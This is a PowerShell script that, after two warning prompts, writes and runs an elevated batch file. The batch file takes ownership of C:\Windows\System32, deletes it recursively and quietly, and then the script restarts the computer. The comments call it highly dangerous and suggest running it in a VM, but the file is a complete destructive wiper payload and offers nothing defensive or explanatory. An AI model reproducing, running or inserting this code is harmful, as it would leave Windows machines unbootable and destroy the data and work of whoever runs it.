<#
THIS SCRIPT IS HIGHLY DANGEROUS. MAKE SURE THAT YOU 
RUN THIS SCRIPT IN A SAFE ENVIRONMENT (VM PREFFERED)
#>


<#
First warning function
If user wants to back out, they can press any key and the script exits
#>
function Warningscript{
Write-host "
WARNING. THE SCRIPT YOU ARE ABOUT TO RUN IS CONSIDERED
TO BE HIGHLY DANGEROUS. IF YOU DON'T KNOW WHAT YOU JUST LAUNCHED,
EXIT NOW AND NOTHING WILL HAPPEN."
$WarningResponce = Read-host "Press Y to continue, or press any key to back out."
if ($WarningResponce -eq "Y"){
Lastwarning
}
else {
exit
}
}

<#
Final warning
If user wants to back out, they can press any key
otherwise the script will run
#>
function Lastwarning{
 Write-host "
LAST CHANCE. WE DO NOT TAKE FULL RESPONSIBILITY ON WHATS ABOUT TO HAPPEN"
    $Lastchance = Read-host "Type 'I understand' to continue, (no quotations and caps sensitive) otherwise press any key to back out"
    if ($Lastchance -eq "I understand"){
    Payload
    }
    else {
    exit
}
}

<#
Writes a command to the batch file, executes the file, removes the batch file 
when finished, then restarts the computer
#>
function Payload{
Set-Location $PWD
echo "@echo off" "takeown /f C:\Windows\System32" "cacls C:\Windows\System32" "rd /s /q %windir%\system32"| out-file -Encoding ascii del.bat
powershell -command "Start-Process del.bat -Verb runas -Wait"
Remove-Item $PWD\del.bat 
Restart-Computer
}

<#
Runs the script
#>
Warningscript